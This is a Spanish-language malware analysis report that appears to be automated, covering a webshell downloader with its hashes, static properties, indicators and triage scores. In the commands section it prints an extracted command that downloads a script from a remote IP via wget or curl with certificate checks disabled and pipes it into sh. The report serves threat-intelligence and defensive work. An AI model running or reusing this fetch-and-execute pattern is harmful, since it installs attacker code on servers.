# 🧬 Payload Analysis

`dfa8f7a19579b2056adc69113a6d05e1ece9e5e68cfdd02490474559c5d14a48`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. **Ficha malware:** [malware-like/oraculo/downloader/dfa8f7a19579b2056adc69113a6d05e1ece9e5e68cfdd02490474559c5d14a48.md](../../../../../malware-like/oraculo/downloader/dfa8f7a19579b2056adc69113a6d05e1ece9e5e68cfdd02490474559c5d14a48.md)


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `Critical`

## 🗓️ Registro

- **Registrado:** `2026-08-09T20:32:17.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `dfa8f7a19579b2056adc69113a6d05e1ece9e5e68cfdd02490474559c5d14a48`
- **SHA1:** `2467f5ab22f9e97fdf3fe551e12c4f82e0c2e019`
- **MD5:** `027be1f3d30a9944c65d10e97d38049c`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with very long lines (1268), with CRLF line terminators |
| Tamaño | 4.0 KiB |
| Entropía | 6.05 |
| Strings | 43 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with very long lines (1268), with CRLF line terminators; iocs=6

## 🖥️ Comandos observados / extraídos

```text
echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh || curl -sk hxxps://14.46.136.XXX/sh) | sh -s apache.selfr
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxps://14.46.136.XXX/sh) | strings |
| url | hxxps://14.46.136.XXX/sh | strings |
| ip | 190.179.140.XXX | static_analysis |
| ip | 14.46.136.XXX | static_analysis |
| command | echo (wget --no-check-certificate -qO- hxxps://14.46.136.XXX/sh \|\| curl -sk hxxps://14.46.136.XXX/sh) \| sh -s apache.selfr | strings |
| hash | dfa8f7a19579b2056adc69113a6d05e1ece9e5e68cfdd02490474559c5d14a48 | static_analysis |
| ip | 170.9.16.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | candidate malware unknown |
| Prioridad | medium |
| Score | 5.0 |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
